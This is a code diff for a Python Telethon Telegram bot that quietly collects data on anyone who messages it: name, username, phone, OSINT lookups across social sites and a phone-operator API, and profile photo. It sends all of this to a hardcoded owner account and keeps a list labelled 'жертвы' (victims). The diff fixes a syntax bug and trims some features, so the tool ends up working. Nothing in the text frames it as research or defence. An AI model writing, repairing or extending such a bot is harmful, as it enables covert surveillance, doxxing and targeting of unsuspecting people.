@@ -1,3 +1,4 @@
+cat > bot.py << 'EOF'
 from telethon import TelegramClient, events
 from datetime import datetime
 import json
@@ -25,8 +26,7 @@ def search_by_username(username):
         "Twitter": f"https://twitter.com/{username}",
         "GitHub": f"https://github.com/{username}",
         "TikTok": f"https://www.tiktok.com/@{username}",
-        "VK": f"https://vk.com/{username}",
-        "YouTube": f"https://youtube.com/@{username}"
+        "VK": f"https://vk.com/{username}"
     }
     for name, url in sites.items():
         try:
@@ -47,7 +47,7 @@ def search_by_phone(phone):
         if r.status_code == 200:
             data = r.json()
             results["operator"] = data.get("operator", {}).get("name")
-            results("region") = data.get("region", {}).get("name")
+            results["region"] = data.get("region", {}).get("name")
     except:
         pass
     return results
@@ -71,7 +71,7 @@ async def handler(event):
     user = await event.get_sender()
     
     if user.id == OWNER_ID:
-        await event.reply("✅ БОТ АКТИВЕН\n\n/stats - статистика\n/list - список жертв\n/help - помощь")
+        await event.reply("✅ БОТ АКТИВЕН\n\n/stats - статистика\n/list - список жертв")
         return
     
     osint_data = {}
@@ -95,7 +95,7 @@ Username: @{user.username}
 Телефон: {getattr(user, 'phone', 'Скрыт')}
 Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}
 
-【OSINT ПРОБИВ】
+【OSINT】
 {json.dumps(osint_data, indent=2, ensure_ascii=False)}
 
 Ссылка: tg://user?id={user.id}"""
@@ -105,7 +105,7 @@ Username: @{user.username}
     try:
         photos = await client.get_profile_photos(user.id, limit=1)
         if photos:
-            await client.send_file(OWNER_ID, photos[0], caption=f"@{user.username}")
+            await client.send_file(OWNER_ID, photos[0])
     except:
         pass
     
@@ -122,12 +122,9 @@ async def list_cmd(event):
         return
     text = "Жертвы:\n"
     for v in victims[-10:]:
-        text += f"- {v['first_name']} @{v['username']} | {v.get('osint', {})}\n"
+        text += f"- {v['first_name']} @{v['username']}\n"
     await event.reply(text)
-
-@client.on(events.NewMessage(pattern='/help', from_users=OWNER_ID))
-async def help_cmd(event):
-    await event.reply("/start @username - пробив по юзернейму\n/start +79991234567 - пробив по номеру")
 
 print("Бот запущен")
 client.run_until_disconnected()
+EOF
